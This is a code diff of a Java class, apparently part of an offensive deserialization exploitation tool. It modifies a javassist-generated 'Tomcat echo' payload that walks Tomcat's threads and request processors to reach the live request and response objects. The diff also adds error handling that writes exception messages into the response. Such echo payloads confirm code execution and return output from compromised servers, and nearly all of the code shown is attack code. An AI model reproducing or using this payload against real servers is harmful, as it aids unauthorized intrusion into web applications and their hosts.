@@ -1,10 +1,18 @@
 package com.summersec.attack.deser.echo;
 
 import javassist.*;
-import java.io.*;
 
+import java.io.IOException;
 
-public class TomcatEcho implements EchoPayload {
+/**
+ * @ClassName: TomcatEcho2
+ * @Description: TODO
+ * @Author: Summer
+ * @Date: 2022/1/19 11:33
+ * @Version: v1.0.0
+ * @Description:
+ **/
+public class TomcatEcho2 implements EchoPayload{
     @Override
     public CtClass genPayload(final ClassPool pool) throws CannotCompileException, NotFoundException, IOException {
         final CtClass clazz = pool.makeClass("com.summersec.x.Test" + System.nanoTime());
@@ -53,7 +61,6 @@ public class TomcatEcho implements EchoPayload {
         clazz.addConstructor(CtNewConstructor.make("public TomcatEcho() throws Exception {\n" +
                 "        boolean var4 = false;\n" +
                 "        Thread[] var5 = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), \"threads\");\n" +
-                "\n" +
                 "        for (int var6 = 0; var6 < var5.length; ++var6) {\n" +
                 "            Thread var7 = var5[var6];\n" +
                 "            if (var7 != null) {\n" +
@@ -66,18 +73,19 @@ public class TomcatEcho implements EchoPayload {
                 "                        } catch (Exception var13) {\n" +
                 "                            continue;\n" +
                 "                        }\n" +
-                "\n" +
                 "                        java.util.List var9 = (java.util.List) getFV(var1, \"processors\");\n" +
                 "\n" +
                 "                        for(int var10 = 0; var10 < var9.size(); ++var10) {\n" +
                 "                            Object var11 = var9.get(var10);\n" +
                 "                            var1 = getFV(var11, \"req\");\n" +
                 "                            Object var2 = var1.getClass().getMethod(\"getResponse\",new Class[0]).invoke(var1, new Object[0]);\n" +
+                "                            try {\n" +
+                "\n" +
+                "\n" +
                 "                            var3 = (String)var1.getClass().getMethod(\"getHeader\", new Class[]{String.class}).invoke(var1, new Object[]{new String(\"Host\")});\n" +
                 "                            if (var3 != null && !var3.isEmpty()) {\n" +
                 "                                var2.getClass().getMethod(\"setStatus\", new Class[]{Integer.TYPE}).invoke(var2, new Object[]{new Integer(200)});\n" +
                 "                                var2.getClass().getMethod(\"addHeader\", new Class[]{String.class, String.class}).invoke(var2, new Object[]{new String(\"Host\"), var3});\n" +
-//                "                                var2.getClass().getMethod(\"addHeader\", new Class[]{String.class, String.class}).invoke(var2, new Object[]{new String(\"Setcoolie\"), var3});\n" +
                 "                                var4 = true;\n" +
                 "                            }\n" +
                 "\n" +
@@ -92,6 +100,9 @@ public class TomcatEcho implements EchoPayload {
                 "                            if (var4) {\n" +
                 "                                break;\n" +
                 "                            }\n" +
+                "                            }catch (Exception var14) {\n" +
+                "                                writeBody(var2, var14.getMessage().getBytes());\n" +
+                "                            }\n" +
                 "                        }\n" +
                 "\n" +
                 "                        if (var4) {\n" +
@@ -104,5 +115,14 @@ public class TomcatEcho implements EchoPayload {
                 "    }",clazz));
 
         return clazz;
+    }
+
+
+    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException {
+        ClassPool pool = ClassPool.getDefault();
+//        TomcatEcho2 tomcatEcho2 = new TomcatEcho2();
+        SpringEcho springEcho = new SpringEcho();
+        springEcho.genPayload(pool);
+//        tomcatEcho2.genPayload(pool);
     }
 }
